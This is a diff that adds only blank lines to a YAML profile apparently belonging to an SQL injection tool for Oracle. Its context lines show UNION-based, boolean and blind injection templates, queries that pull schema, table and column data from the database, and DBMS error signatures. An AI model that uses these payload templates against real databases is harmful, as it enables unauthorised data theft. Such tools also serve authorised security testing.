@@ -9,6 +9,7 @@ resource:
       || user 
       || '${TRAIL_SQL}'
   FROM v%24instance
+  
  schema: 
   database: |
    select
@@ -46,6 +47,7 @@ resource:
        group by t.s
        {limit}
    )
+   
   table: |
    select
        utl_raw.cast_to_varchar2(
@@ -83,6 +85,7 @@ resource:
        group by t.s
        {limit}
    )
+   
   column: |
    select
        utl_raw.cast_to_varchar2(
@@ -120,6 +123,7 @@ resource:
        group by t.s
        {limit}
    )
+   
   row: 
    query: |
     select
@@ -161,6 +165,7 @@ resource:
    fields: 
     field: "trim(to_char(${FIELD}))"
     concat: "|| '%7f' ||"
+    
 strategy: 
  configuration: 
   slidingWindow: |
@@ -190,6 +195,7 @@ strategy:
     - "Warning: oci_execute()"
     - "Warning: oci_fetch_array()"
     - "Unclosed quotation mark after the character string '"
+    
  normal: 
   indices: "union select ${INDICES} from dual"
   capacity: |
@@ -201,6 +207,7 @@ strategy:
        FROM dual
    )
   orderBy: "order by 1337"
+  
  boolean: 
   test: 
    falses: 
@@ -230,4 +237,5 @@ strategy:
         ${BIT}
     )
    length: "length(${INJECTION}) > ${INDEX}"
+   
   blind: "and ${TEST}"
